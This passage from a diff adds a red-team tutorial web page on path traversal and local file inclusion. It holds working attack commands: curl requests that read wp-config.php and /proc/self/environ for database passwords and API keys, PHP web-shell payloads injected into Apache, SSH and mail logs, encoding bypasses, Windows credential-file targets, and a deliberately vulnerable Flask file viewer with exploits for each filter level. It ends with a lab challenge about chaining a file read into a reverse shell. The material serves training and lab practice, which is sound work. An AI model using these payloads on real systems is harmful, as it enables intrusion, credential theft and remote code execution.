+  curl -s &#34;https://example.com/download?file=/var/www/html/$config&#34;
+done
+
+# Step 2: Extract credentials
+# From wp-config.php:
+# define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+# define(&#39;DB_USER&#39;, &#39;wp_user&#39;);
+# define(&#39;DB_PASSWORD&#39;, &#39;SuperSecret123&#39;);
+# define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+
+# Step 3: Connect to database with extracted credentials
+mysql -u wp_user -p&#39;SuperSecret123&#39; -h target-host wordpress
+# Dump user table, find admin password hash, crack it, use for SSH/RDP
+						</pre>
+					</section>
+					<section>
+						<h3 id="log-file-poisoning">Log File Poisoning</h3>
+						<p>
+							If you have
+							<abbr title="Local File Inclusion">LFI</abbr>
+							but not code execution, inject
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							code into a log file and then include that log file.
+						</p>
+						<pre class="bash">
+# Step 1: Inject PHP code into Apache access log via User-Agent
+curl -s &#39;https://example.com/&#39; \
+  -H &#39;User-Agent: &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;
+
+# Step 2: Access the log file via LFI
+curl -s &#39;https://example.com/?page=/var/log/apache2/access.log&amp;cmd=id&#39;
+
+# Alternative log locations:
+# /var/log/apache2/access.log          (Debian/Ubuntu Apache)
+# /var/log/httpd/access_log            (RHEL/CentOS Apache)
+# /var/log/nginx/access.log            (nginx)
+# /var/log/apache2/error.log           (Error log — injection via 404 path)
+curl -s &#39;https://example.com/&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;  # 404 path injection
+
+# SSH log poisoning — inject SSH username
+ssh &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;@target.example.com&#39;
+# Then include: /var/log/auth.log
+curl -s &#39;https://example.com/?page=/var/log/auth.log&amp;cmd=id&#39;
+
+# Email log poisoning — send email to nonexistent user with PHP in From
+# SMTP: MAIL FROM: &lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;
+
+# FTP log poisoning (if proftpd/vsftpd log readable)
+						</pre>
+					</section>
+					<section>
+						<h3 id="proc-filesystem-exploitation-linux">/proc Filesystem Exploitation (Linux)</h3>
+						<p>
+							The
+							<code>/proc</code>
+							filesystem is a goldmine for path traversal. It exposes the kernel's view of every
+							process, including the process handling your request.
+						</p>
+						<pre class="bash">
+# /proc/self/environ — environment variables of the current worker process
+# Often contains: DB_HOST, DB_USER, DB_PASS, API_KEY, SECRET_KEY, APP_SECRET
+curl -s &#39;https://example.com/download?file=/proc/self/environ&#39; | tr &#39;\0&#39; &#39;\n&#39;
+
+# /proc/self/cmdline — command line used to start the process
+curl -s &#39;https://example.com/download?file=/proc/self/cmdline&#39; | tr &#39;\0&#39; &#39; &#39;
+
+# /proc/self/cwd/ — symlink to the current working directory
+# Allows traversal relative to the application root, bypassing prefix requirements
+curl -s &#39;https://example.com/download?file=/proc/self/cwd/../.env&#39;
+# If cwd = /var/www/app/, resolves to /var/www/app/../.env → /var/www/.env
+
+# /proc/self/fd/N — open file descriptors
+# If the server keeps /var/log/apache2/access.log open on fd 7:
+curl -s &#39;https://example.com/download?file=/proc/self/fd/7&#39;
+# Read the live access log — may contain session cookies, tokens, request bodies
+
+# /proc/self/maps — memory layout of the process
+curl -s &#39;https://example.com/download?file=/proc/self/maps&#39;
+# Useful for exploit development (ASLR bypass, finding libraries)
+
+# /proc/self/status — process status and capabilities
+curl -s &#39;https://example.com/download?file=/proc/self/status&#39;
+# Check: CapEff (effective capabilities), Uid/Gid
+
+# /proc/self/mounts — mounted filesystems
+curl -s &#39;https://example.com/download?file=/proc/self/mounts&#39;
+# Find: Docker volumes, NFS mounts, tmpfs locations
+
+# /proc/net/tcp — active TCP connections
+curl -s &#39;https://example.com/download?file=/proc/net/tcp&#39;
+# Decode with:
+# echo &#34;0100007F:1F90&#34; | python3 -c &#34;import sys; hex=sys.stdin.read().strip().split(&#39;:&#39;); ip=&#39;.&#39;.join([str(int(hex[0][i:i+2],16)) for i in range(6,-1,-2)]); port=int(hex[1],16); print(f&#39;{ip}:{port}&#39;)&#34;
+# Lists all TCP connections including internal services
+						</pre>
+					</section>
+					<section>
+						<h3 id="windows-specific-path-traversal">Windows-Specific Path Traversal</h3>
+						<p>Windows filesystem semantics differ from Unix in ways that create additional traversal possibilities.</p>
+						<pre class="bash">
+# Windows paths use backslash, but most web apps accept both
+..\..\..\windows\win.ini
+../../../../windows/win.ini
+
+# ADS (Alternate Data Streams) — hidden file content
+file.txt::$DATA          # Access default stream
+file.txt:secret.txt::$DATA  # Access named stream
+
+# \\?\ prefix — bypass MAX_PATH limitation (260 chars)
+\\?\C:\windows\win.ini
+
+# Absolute UNC paths — some apps resolve these
+\\localhost\C$\windows\win.ini
+\\127.0.0.1\C$\windows\win.ini
+
+# Common Windows targets
+C:\windows\win.ini                    # Basic confirmation file
+C:\windows\system32\drivers\etc\hosts # Internal hostnames
+C:\inetpub\wwwroot\web.config         # IIS config (connection strings!)
+C:\xampp\htdocs\wp-config.php        # XAMPP WordPress
+C:\wamp64\www\wp-config.php          # WAMP WordPress
+C:\Program Files\MySQL\my.ini        # MySQL config
+C:\Users\All Users\                  # Shared user data
+						</pre>
+					</section>
+					<section>
+						<h3 id="manual-exploitation-walkthrough">Manual Exploitation Walkthrough</h3>
+						<p>A vulnerable Flask file viewer application for practice.</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Vulnerable Flask file viewer with multiple traversal vulnerability levels.
+&#34;&#34;&#34;
+from flask import Flask, request, render_template_string, send_file
+import os
+
+app = Flask(__name__)
+BASE_DIR = &#34;/var/www/files&#34;
+
+HTML = &#34;&#34;&#34;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;File Viewer&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3&gt;Level 1: No filter&lt;/h3&gt;
+&lt;form action=&#34;/view&#34; method=&#34;GET&#34;&gt;
+  &lt;input name=&#34;file&#34; placeholder=&#34;File path&#34; value=&#34;report.pdf&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;View&#34;&gt;
+&lt;/form&gt;
+&lt;hr&gt;
+&lt;h3&gt;Level 2: Strips ../&lt;/h3&gt;
+&lt;form action=&#34;/view-stripped&#34; method=&#34;GET&#34;&gt;
+  &lt;input name=&#34;file&#34; placeholder=&#34;File path&#34; value=&#34;report.pdf&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;View (Stripped)&#34;&gt;
+&lt;/form&gt;
+&lt;hr&gt;
+&lt;h3&gt;Level 3: Extension whitelist&lt;/h3&gt;
+&lt;form action=&#34;/view-whitelist&#34; method=&#34;GET&#34;&gt;
+  &lt;input name=&#34;file&#34; placeholder=&#34;File path&#34; value=&#34;report.pdf&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;View (Whitelist)&#34;&gt;
+&lt;/form&gt;
+&lt;hr&gt;
+&lt;h3&gt;Level 4: Requires prefix&lt;/h3&gt;
+&lt;form action=&#34;/view-prefix&#34; method=&#34;GET&#34;&gt;
+  &lt;input name=&#34;file&#34; placeholder=&#34;File path&#34; value=&#34;report.pdf&#34;&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;View (Prefix)&#34;&gt;
+&lt;/form&gt;
+&lt;hr&gt;
+{% if content %}&lt;pre&gt;{{ content }}&lt;/pre&gt;{% endif %}
+{% if error %}&lt;p style=&#34;color:red&#34;&gt;{{ error }}&lt;/p&gt;{% endif %}
+&lt;/body&gt;&lt;/html&gt;
+&#34;&#34;&#34;
+
+@app.route(&#39;/view&#39;)
+def view():
+    filename = request.args.get(&#39;file&#39;, &#39;&#39;)
+    # VULNERABLE: No filter at all
+    filepath = os.path.join(BASE_DIR, filename)
+    try:
+        with open(filepath, &#39;r&#39;, errors=&#39;replace&#39;) as f:
+            content = f.read(2000)
+        return render_template_string(HTML, content=content)
+    except Exception as e:
+        return render_template_string(HTML, error=str(e))
+
+@app.route(&#39;/view-stripped&#39;)
+def view_stripped():
+    filename = request.args.get(&#39;file&#39;, &#39;&#39;)
+    # WEAK FILTER: Strip ../ once
+    filename = filename.replace(&#39;../&#39;, &#39;&#39;)
+    filepath = os.path.join(BASE_DIR, filename)
+    try:
+        with open(filepath, &#39;r&#39;, errors=&#39;replace&#39;) as f:
+            content = f.read(2000)
+        return render_template_string(HTML, content=content)
+    except Exception as e:
+        return render_template_string(HTML, error=str(e))
+
+@app.route(&#39;/view-whitelist&#39;)
+def view_whitelist():
+    filename = request.args.get(&#39;file&#39;, &#39;&#39;)
+    # WEAK FILTER: Extension whitelist only
+    allowed_extensions = (&#39;.pdf&#39;, &#39;.txt&#39;, &#39;.jpg&#39;, &#39;.png&#39;, &#39;.html&#39;)
+    if not any(filename.lower().endswith(ext) for ext in allowed_extensions):
+        return render_template_string(HTML, error=&#34;File type not allowed&#34;)
+    filepath = os.path.join(BASE_DIR, filename)
+    try:
+        with open(filepath, &#39;r&#39;, errors=&#39;replace&#39;) as f:
+            content = f.read(2000)
+        return render_template_string(HTML, content=content)
+    except Exception as e:
+        return render_template_string(HTML, error=str(e))
+
+@app.route(&#39;/view-prefix&#39;)
+def view_prefix():
+    filename = request.args.get(&#39;file&#39;, &#39;&#39;)
+    # WEAK FILTER: Must start with BASE_DIR
+    filepath = os.path.join(BASE_DIR, filename)
+    if not os.path.realpath(filepath).startswith(BASE_DIR):
+        return render_template_string(HTML, error=&#34;Access denied&#34;)
+    try:
+        with open(filepath, &#39;r&#39;, errors=&#39;replace&#39;) as f:
+            content = f.read(2000)
+        return render_template_string(HTML, content=content)
+    except Exception as e:
+        return render_template_string(HTML, error=str(e))
+
+if __name__ == &#39;__main__&#39;:
+    os.makedirs(BASE_DIR, exist_ok=True)
+    with open(os.path.join(BASE_DIR, &#34;report.pdf&#34;), &#34;w&#34;) as f:
+        f.write(&#34;This is a sample PDF report.&#34;)
+    app.run(host=&#39;0.0.0.0&#39;, port=5000, debug=False)
+						</pre>
+						<pre class="bash">
+# Level 1 exploitation — no filter
+curl -s &#39;http://localhost:5000/view?file=../../../etc/passwd&#39;
+
+# Level 2 exploitation — strips ../ once
+# Bypass with ....//
+curl -s &#39;http://localhost:5000/view-stripped?file=....//....//....//etc/passwd&#39;
+# Bypass with ..././
+curl -s &#39;http://localhost:5000/view-stripped?file=..././..././..././etc/passwd&#39;
+# Bypass with URL encoding
+curl -s &#39;http://localhost:5000/view-stripped?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&#39;
+
+# Level 3 exploitation — extension whitelist
+# Prepended prefix: /var/www/files/../../../etc/passwd → /etc/passwd
+# But must end in .pdf, .txt, .jpg, .png, or .html
+# Append extension (doesn&#39;t affect Unix path resolution):
+curl -s &#39;http://localhost:5000/view-whitelist?file=../../../etc/passwd&#39;
+# Need extension: try with null byte via URL — null bytes are stripped by most web frameworks
+# Alternative: /proc/self/environ — not a standard file extension, won&#39;t match
+# Alternative: find a .txt or .html file outside BASE_DIR: /etc/hostname is text
+curl -s &#39;http://localhost:5000/view-whitelist?file=../../../etc/hostname&#39;
+# No .txt extension... another approach: read app source via /proc/self/cwd/app.py → fails extension check
+# Bypass: /proc/self/fd/ symlinks — read current script
+curl -s &#39;http://localhost:5000/view-whitelist?file=../../../proc/self/cwd/app.py&#39;
+# Still needs .txt... This is where creativity and chaining techniques matter.
+
+# Level 4 exploitation — prefix check with realpath()
+# realpath() resolves symlinks, so /proc/self/cwd trick might not work
+# But: race conditions, or files within the tree that are symlinked
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-and-common-mistakes">Verification and Common Mistakes</h3>
+						<pre class="bash">
+# Verify traversal works by reading a known file
+curl -s &#39;https://example.com/download?file=../../../etc/passwd&#39; | head -1
+# Should output: root:x:0:0:root:/root:/bin/bash
+# If not, check: is the response truncated? Are you in a chroot?
+# Try: /etc/hostname (single line, simple) or /etc/issue
+
+# Verify you&#39;re not in a container (Docker/Podman)
+curl -s &#39;https://example.com/download?file=/proc/1/cgroup&#39; | grep -c &#39;docker\|containerd\|libpod&#39;
+# If matches found → containerized environment — limits what you can access
+
+# Verify file permissions — are you the www-data user?
+curl -s &#39;https://example.com/download?file=/proc/self/status&#39; | grep -E &#39;^Uid|^Gid&#39;
+# Shows UID/GID of the web server process
+						</pre>
+						<p>
+							<b>Common mistakes:</b>
+							1.
+							<b>Not accounting for the prepended path.</b>
+							If the app prefixes
+							<code>/var/www/html/uploads/</code>
+							, you need enough
+							<code>../</code>
+							to escape:
+							<code>../../../../../../etc/passwd</code>
+							. 1.
+							<b>Using '../' when '..\' is needed.</b>
+							Test both on Windows targets. 1.
+							<b>Not recognizing chroot or container boundaries.</b>
+							If in a
+							container,
+							<code>/etc/passwd</code>
+							might exist but contain only container users. 1.
+							<b>Giving up after one encoding fails.</b>
+							Try
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							encoding, double encoding, Unicode, overlong UTF-8, and
+							null bytes systematically. 1.
+							<b>Assuming the file read gives raw output.</b>
+							Some apps wrap output
+							in
+							<abbr title="Hypertext Markup Language">HTML</abbr>
+							,
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							, or
+							<abbr title="Extensible Markup Language">XML</abbr>
+							. View the page source.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Read
+							<code>/etc/fake-passwd</code>
+							and the fake
+							<abbr title="Secure Shell">SSH</abbr>
+							key from every level of the container,
+							then chain a file read into a working reverse shell. The container ships a Flask file viewer
+							with four filter levels, a
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							include endpoint, and fake secrets
+							placed across the filesystem.
+						</p>
+						<p><a href="/wiki/articles/redteam/path-traversal.Containerfile">path-traversal.Containerfile</a></p>
+						<pre class="bash">
+podman build -t path-traversal -f path-traversal.Containerfile .
+podman run -d --name traversal-lab -p 8080:80 path-traversal
+
+# Access:
+# http://localhost:8080/                    - landing page with all levels
+# http://localhost:8080/view?file=          - level 1: no filter
+# http://localhost:8080/view-stripped?file= - level 2: strips ..
+# http://localhost:8080/view-whitelist?file=- level 3: extension whitelist
+# http://localhost:8080/view-prefix?file=   - level 4: prefix requirement
+# http://localhost:8080/include.php?page=   - PHP include-based traversal
+
+# Level 1 and 2, escape the base directory:
+curl -s &#39;http://localhost:8080/view?file=../../../etc/fake-passwd&#39;
+curl -s &#39;http://localhost:8080/view-stripped?file=....//....//....//etc/fake-passwd&#39;
+
+# Level 4 checks a path prefix, so include the base directory:
+curl -s &#39;http://localhost:8080/view-prefix?file=/var/www/files/../../../etc/fake-passwd&#39;
+
+# Confirm the hit and clean up:
+podman logs traversal-lab | tail -5
+podman rm -f traversal-lab
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank">OWASP Path Traversal</a></li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/22.html" target="_blank">CWE-22: Improper Limitation of a Pathname</a></li>
+							<li><a class="icon-website" href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include" target="_blank">OWASP Testing Guide: Testing for Path Traversal</a></li>
+							<li><a class="icon-website" href="https://www.php.net/manual/en/wrappers.php" target="_blank">PHP: Supported Protocols and Wrappers</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man5/proc.5.html" target="_blank">proc(5) - Linux manual page</a></li>
+							<li><a class="icon-github" href="https://github.com/yandex/gixy" target="_blank">nginx alias traversal (CVE-2021-... class)</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
